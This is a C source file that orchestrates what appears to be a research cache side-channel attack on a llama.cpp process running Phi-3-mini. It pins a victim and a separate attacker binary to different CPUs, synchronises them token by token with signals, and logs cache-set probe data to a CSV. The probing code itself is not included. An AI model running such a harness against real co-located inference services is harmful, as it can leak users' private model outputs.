// File: orchastractor.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sched.h>
#include <signal.h>
#include <string.h>

#define CPU_VICTIM   7
#define MAX_TOKENS   32064

static void bind_cpu(int cpu_to_bind) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu_to_bind, &set);
    if (sched_setaffinity(0, sizeof(set), &set) < 0) {
        perror("sched_setaffinity");
        exit(1);
    }
}

int victim_prepare(void) {
    pid_t victim_pid = fork();
    if (victim_pid < 0) {
        perror("fork");
        exit(1);
    }
    if (victim_pid == 0) {
        bind_cpu(CPU_VICTIM);
        execlp("python3", "python3",
               "src/victim.py",
               "/home/user/Projects/llamacpp_detection/models/"
               "phi3-mini/Phi-3-mini-4k-instruct-q4.gguf",
               (char *)NULL);
        perror("execlp");
        exit(1);
    }
    return victim_pid;
}

// --- SIGUSR2 handler for "decode finished" ACK from victim ---
volatile sig_atomic_t ack_received = 0;
static void on_sigusr2(int signo) {
    (void)signo;
    ack_received = 1;
}

int main(void) {
    // 1) Bind this orchestrator to CPU 0
    bind_cpu(0);

    // 2) Install SIGUSR2 handler
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = on_sigusr2;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    if (sigaction(SIGUSR2, &sa, NULL) < 0) {
        perror("sigaction(SIGUSR2)");
        exit(1);
    }

    // 3) Write CSV header (overwrite existing)
    const char *output_file = "results/all_ds.csv";
    FILE *out = fopen(output_file, "w");
    if (!out) {
        perror("Failed to open output file");
        return 1;
    }
    fprintf(out, "TokenIndex,DetectionIndex,BurstIteration,CacheSet,Probe\n");
    fclose(out);

    // 4) Launch victim
    int victim_pid = victim_prepare();

    // 5) Initial busy-wait for victim startup
    printf("[+] Initializing attack, waiting for 10 seconds...\n");
    fflush(stdout);
    for (volatile int i = 0; i < 1500000000; i++);
    printf("[+] Starting attack over %d tokens...\n", MAX_TOKENS);
    fflush(stdout);

    // 6) Token loop with two-way handshake
    for (int token = 0; token < MAX_TOKENS; token++) {
        // reset ACK flag
        ack_received = 0;

        // fork attacker
        pid_t attacker = fork();
        if (attacker < 0) {
            perror("fork");
            break;
        }

        if (attacker == 0) {
            // child: run attacker (which itself sends SIGUSR1 to victim)
            char cmd[512];
            snprintf(cmd, sizeof(cmd),
                     "taskset -c 3 ./bin/orchastration_attacker "
                     "%d %s %d",
                     token, output_file, victim_pid);
            execl("/bin/sh", "sh", "-c", cmd, (char *)NULL);
            perror("execl");
            exit(1);
        }

        // parent: wait for attacker to finish dumping its results
        int status;
        waitpid(attacker, &status, 0);

        // now wait for the victim to ACK (SIGUSR2) that it has
        // completed the decode loop for this token
        while (!ack_received) {
            pause();
        }

        // report progress
        printf("\rProgress: %6d / %6d", token + 1, MAX_TOKENS);
        fflush(stdout);
    }

    // 7) All tokens done → kill & reap victim
    printf("\n[+] All tokens processed; killing victim (PID %d)...\n",
           victim_pid);
    kill(victim_pid, SIGKILL);
    waitpid(victim_pid, NULL, 0);

    printf("[+] Attack complete.\n");
    return 0;
}
